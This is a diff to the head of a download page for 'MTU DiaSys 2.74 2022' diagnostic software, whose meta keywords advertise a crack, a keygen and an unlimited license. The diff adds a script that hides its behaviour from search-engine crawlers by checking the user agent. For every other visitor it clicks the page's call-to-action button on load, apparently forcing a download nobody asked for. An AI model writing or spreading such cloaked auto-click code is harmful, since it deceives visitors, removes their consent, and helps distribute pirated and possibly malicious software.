@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MTU DiaSys 2.74 2022</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download MTU DiaSys 2.74 2022 diagnostic software with unlimited license, supporting Windows 7, 10, 11, in English and German.">
     <meta name="keywords" content="MTU DiaSys 2.74 2022 download, MTU DiaSys 2.74 2022 free download, MTU DiaSys 2.74 2022 diagnostic software, MTU DiaSys diagnostic software, MTU DiaSys 2.74 2022 crack, MTU DiaSys 2.74 2022 keygen, MTU DiaSys 2022 download, MTU DiaSys 2022 free download, MTU DiaSys 2.74 download free, MTU DiaSys unlimited license, MTU DiaSys English download, MTU DiaSys German download, MTU DiaSys CAN support, MTU DiaSys Windows 7 download, MTU DiaSys Windows 10 download, MTU DiaSys Windows 11 download, MTU engine controllers software, MTU ECU-7 ECU-9 functions, MTU DiaSys features, MTU Diasys software, скачать MTU DiaSys 2.74 2022, бесплатно MTU DiaSys 2.74 2022 скачать, MTU DiaSys диагностическое программное обеспечение, MTU DiaSys диагностическое программное обеспечение скачать, MTU DiaSys программное обеспечение ECU-7 ECU-9, MTU DiaSys особенности, MTU DiaSys программа, MTU DiaSys програма, скачати MTU DiaSys 2.74 2022, безкоштовно MTU DiaSys 2.74 2022 скачати, MTU DiaSys діагностичне програмне забезпечення, programa de diagnóstico MTU DiaSys, MTU DiaSys diagnóstico software, MTU DiaSys 2.74 high speed download, MTU DiaSys ECU functions, MTU control systems software">
     <style>
